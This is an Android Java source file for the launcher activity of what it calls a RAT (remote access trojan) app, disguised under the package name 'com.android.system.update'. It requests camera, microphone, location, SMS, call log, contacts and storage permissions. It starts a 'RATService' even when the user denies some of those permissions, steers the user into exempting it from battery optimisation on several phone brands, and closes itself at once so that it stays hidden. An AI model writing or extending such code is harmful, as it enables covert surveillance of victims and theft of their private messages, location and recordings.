package com.android.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
    
    // List of all permissions your app needs
    private final String[] requiredPermissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.SCHEDULE_EXACT_ALARM,
        Manifest.permission.USE_EXACT_ALARM,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        
        // Check and request permissions
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            // Request all missing permissions at once
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // All permissions already granted
            startRATService();
            
            // Check and request battery optimization exemption
            checkBatteryOptimization();
            
            // Open battery settings to help user whitelist the app
            openBatteryOptimizationSettings();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }
            
            if (allGranted) {
                // All permissions granted, start service
                startRATService();
                // Check battery optimization
                checkBatteryOptimization();
                // Open battery settings
                openBatteryOptimizationSettings();
            } else {
                // Some permissions denied, show warning but still try to start service
                Toast.makeText(this, 
                    "Some permissions denied. Some features may not work.\n" + deniedPermissions.toString(), 
                    Toast.LENGTH_LONG).show();
                startRATService(); // Still try to start service with whatever permissions we have
                
                // Still try to help with battery optimization
                checkBatteryOptimization();
                openBatteryOptimizationSettings();
            }
        }
    }
    
    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                // Show a dialog explaining why user should disable battery optimization
                new androidx.appcompat.app.AlertDialog.Builder(this)
                    .setTitle("Battery Optimization")
                    .setMessage("For the app to work properly in the background, please disable battery optimization. " +
                               "This ensures the service continues running even when the device is idle.")
                    .setPositiveButton("Disable", (dialog, which) -> {
                        requestIgnoreBatteryOptimizations();
                    })
                    .setNegativeButton("Later", null)
                    .show();
            }
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE);
            }
        }
    }
    
    private void openBatteryOptimizationSettings() {
        // Wait a bit before opening battery settings (so user sees the app first)
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        // Try manufacturer-specific battery settings first
        if (!openManufacturerBatterySettings()) {
            // Fallback to generic battery optimization settings
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            startActivity(intent);
        }
    }
    
    private boolean openManufacturerBatterySettings() {
        // Xiaomi
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter", 
                "com.miui.powercenter.PowerSettingsActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Xiaomi
        }
        
        // Huawei
        try {
            Intent intent = new Intent();
            intent.setClassName("com.huawei.systemmanager", 
                "com.huawei.systemmanager.optimize.process.ProtectActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Huawei
        }
        
        // OPPO
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oppo.oppopowermonitor", 
                "com.oppo.oppopowermonitor.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OPPO
        }
        
        // Vivo
        try {
            Intent intent = new Intent();
            intent.setClassName("com.vivo.abe", 
                "com.vivo.abe.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Vivo
        }
        
        // Samsung
        try {
            Intent intent = new Intent();
            intent.setClassName("com.samsung.android.lool", 
                "com.samsung.android.sm.ui.battery.BatteryActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Samsung
        }
        
        // OnePlus
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oneplus.security", 
                "com.oneplus.security.chainlaunch.ChainLaunchConfigActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OnePlus
        }
        
        return false; // No manufacturer settings found
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
            // Check if user granted battery optimization exemption
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                String packageName = getPackageName();
                
                if (pm.isIgnoringBatteryOptimizations(packageName)) {
                    Toast.makeText(this, "Battery optimization disabled. App will run more reliably.", 
                        Toast.LENGTH_LONG).show();
                }
            }
        }
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Optional: Show a message
        Toast.makeText(this, "RAT Service Started", Toast.LENGTH_SHORT).show();
        
        // Close activity immediately (so it's hidden)
        finish();
    }
}
